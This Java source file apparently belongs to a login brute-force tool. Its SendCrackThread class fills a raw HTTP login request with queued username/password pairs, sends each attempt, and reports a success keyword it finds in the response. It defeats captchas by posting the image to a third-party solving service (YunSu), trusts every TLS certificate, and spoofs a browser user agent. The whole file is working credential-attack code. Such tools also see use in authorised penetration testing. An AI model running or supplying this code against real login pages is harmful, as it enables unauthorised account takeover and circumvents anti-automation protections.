package com.fuping;


import javafx.application.Platform;
import javafx.concurrent.Task;
import javafx.scene.control.TextArea;
import org.apache.http.HttpEntity;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContexts;
import org.apache.http.util.EntityUtils;

import javax.net.ssl.SSLContext;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

public class SendCrackThread extends Task<String> {
    private CountDownLatch cdl;
    private LinkedBlockingQueue<UserPassPair> queue;
    private String request;
    private String schema;
    private TextArea id_outputarea2;
    private String keyword2;
    private String chatchaurlinput2;
    private Integer timeout2;
    private Boolean ishavechptcha;
    private YunSuConfig yunSuConfig;
    private String baseurl;

    public SendCrackThread(CountDownLatch cdl, LinkedBlockingQueue<UserPassPair> queue, String request, String schema, TextArea id_outputarea2, String keyword2, String chatchaurlinput2, Integer timeout2, Boolean ishavechptcha, YunSuConfig yunSuConfig, String baseurl) {
        this.cdl = cdl;
        this.queue = queue;
        this.request = request;
        this.schema = schema;
        this.id_outputarea2 = id_outputarea2;
        this.keyword2 = keyword2;
        this.chatchaurlinput2 = chatchaurlinput2;
        this.timeout2 = timeout2;
        this.ishavechptcha = ishavechptcha;
        this.yunSuConfig = yunSuConfig;
        this.baseurl = baseurl;
    }

    protected String call() throws Exception {
        try {
            String ua = "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0";
            SSLContext sslcontext = SSLContexts.custom().loadTrustMaterial(new MyTrustStrategy()).build();
            CloseableHttpResponse httpresponse;
            RequestConfig requestConfig = RequestConfig.custom().setConnectTimeout(this.timeout2.intValue())
                    .setConnectionRequestTimeout(this.timeout2.intValue()).setSocketTimeout(this.timeout2.intValue()).build();

            CloseableHttpClient httpclient = HttpClients.custom().setSSLContext(sslcontext)
                    .setSSLHostnameVerifier(new MyHostnameVerifier()).setUserAgent(ua)
                    .setDefaultRequestConfig(requestConfig).build();

            httpclient.execute(new HttpGet(this.baseurl));

            StringBuilder sb = new StringBuilder();
            UserPassPair up;
            while ((up = (UserPassPair) this.queue.poll(5L, TimeUnit.SECONDS)) != null) {
                sb.setLength(0);

                String newrequest = this.request.replace("$username$", up.getUsername()).replace("$password$",
                        up.getPassword());
                String lastresult = null;

                if (this.ishavechptcha.booleanValue()) {
                    CloseableHttpResponse response = httpclient.execute(new HttpGet(this.chatchaurlinput2));
                    HttpEntity entity = response.getEntity();
                    byte[] captchadata = EntityUtils.toByteArray(entity);
                    String result = YunSu.createByPost(this.yunSuConfig.getUsername(), this.yunSuConfig.getPassword(),
                            this.yunSuConfig.getTypeid(), this.yunSuConfig.getTimeout(), this.yunSuConfig.getSoftid1(),
                            this.yunSuConfig.getSoftkey(), captchadata);
                    System.out.println("result:" + result);
                    int k = result.indexOf("|");
                    if (k == -1) {
                        Platform.runLater(new Runnable() {
                            public void run() {
                                SendCrackThread.this.id_outputarea2.appendText("获取验证码失败\n");
                            }
                        });
                        continue;
                    }
                    lastresult = result.substring(0, k);
                    newrequest = newrequest.replace("$captcha$", lastresult);

                    String xlastresult = lastresult;

                    sb.append("已识别验证码为:" + xlastresult);
                } else {
                    Platform.runLater(new Runnable() {
                        public void run() {
                            SendCrackThread.this.id_outputarea2.appendText("验证码识别为启用。");
                        }
                    });
                }

                int i = newrequest.indexOf(" ");
                int j = newrequest.indexOf(" ", i + 1);
                int k = newrequest.indexOf("Host:", j);
                int l = newrequest.indexOf("\n", k);
                if (k == -1) {
                    Platform.runLater(new Runnable() {
                        public void run() {
                            SendCrackThread.this.id_outputarea2.appendText("未找到Host头，线程退出。");
                        }
                    });
                    this.cdl.countDown();
                    return null;
                }

                int z = newrequest.indexOf("Content-Type:", j);
                int n = newrequest.indexOf("\n", z);
                String contentType = "application/x-www-form-urlencoded";
                if (z != -1) {
                    contentType = newrequest.substring(z + 13, n).trim();
                }

                String url = this.schema + "://" + newrequest.substring(k + 5, l).trim() +
                        newrequest.substring(i + 1, j).trim();

                if (newrequest.startsWith("GET")) {
                    HttpGet httpget = new HttpGet(url);
                    httpget.setHeader("Content-Type", contentType);
                    try {
                        httpresponse = httpclient.execute(httpget);
                    } catch (Exception e) {

                        e.printStackTrace();
                        continue;
                    }
                    String respnsedata = EntityUtils.toString(httpresponse.getEntity(), "utf-8");

                    sb.append("响应状态码:" + httpresponse.getStatusLine().getStatusCode())
                            .append("响应content-length:" + httpresponse.getEntity().getContentLength() + "\n");
                    httpresponse.close();
                } else {
                    HttpPost httppost = new HttpPost(url);
                    int m = newrequest.indexOf("\n\n");
                    String post = newrequest.substring(m + 2);

                    HttpEntity entity = new StringEntity(post);
                    httppost.setHeader("Content-Type", contentType);

                    httppost.setEntity(entity);
                    try {
                        httpresponse = httpclient.execute(httppost);
                    } catch (Exception e) {
                        e.printStackTrace();
                        continue;
                    }
                    String respnsedata = EntityUtils.toString(httpresponse.getEntity(), "utf-8");

                    sb.append(" 响应状态码:" + httpresponse.getStatusLine().getStatusCode())
                            .append(" 响应content-length:" + httpresponse.getEntity().getContentLength());

                    httpresponse.close();
                    System.out.println(respnsedata);
                    if (respnsedata.contains(this.keyword2)) {
                        sb.append(" 关键字匹配成功:" + this.keyword2);
                    }
                    sb.append("\n");

                    String xx = sb.toString();
                    Platform.runLater(new Runnable() {
                        public void run() {
                            SendCrackThread.this.id_outputarea2.appendText(xx);
                        }
                    });
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            this.cdl.countDown();
        }

        return null;
    }
}